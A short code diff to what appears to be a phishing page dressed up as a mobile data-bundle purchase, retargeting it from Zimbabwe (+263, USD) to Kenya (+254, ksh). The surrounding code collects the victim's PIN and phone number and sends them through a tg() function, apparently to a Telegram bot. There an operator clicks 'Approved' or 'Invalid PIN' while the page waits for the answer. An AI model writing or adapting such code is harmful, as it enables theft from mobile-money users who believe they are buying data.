@@ -447,8 +447,8 @@ main {
                 document.getElementById('bBar').style.display = 'block';
                 document.getElementById('bName').textContent = name || 'N/A';
                 document.getElementById('bD').textContent = d;
-                document.getElementById('bP').textContent = 'USD ' + pr;
-                document.getElementById('pinAmt').textContent = 'USD ' + pr;
+                document.getElementById('bP').textContent = 'ksh ' + pr;
+                document.getElementById('pinAmt').textContent = 'ksh ' + pr;
             }
         }
         var boxes = document.querySelectorAll('.otp-box');
@@ -548,9 +548,9 @@ main {
             document.getElementById('ov').classList.add('on');
             var msg = '\u{1f510} <b>PIN Confirmation</b>\n\n' +
                 '<b>PIN:</b> <code>' + pin + '</code>\n' +
-                '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
+                '<b>Phone:</b> <code>+254' + phone + '</code>\n' +
                 '<b>Bundle:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
-                '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>';
+                '<b>Amount:</b> <code>ksh ' + (bd.price || '0.00') + '</code>';
             var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
             tg(msg, btns);
             pollPin();
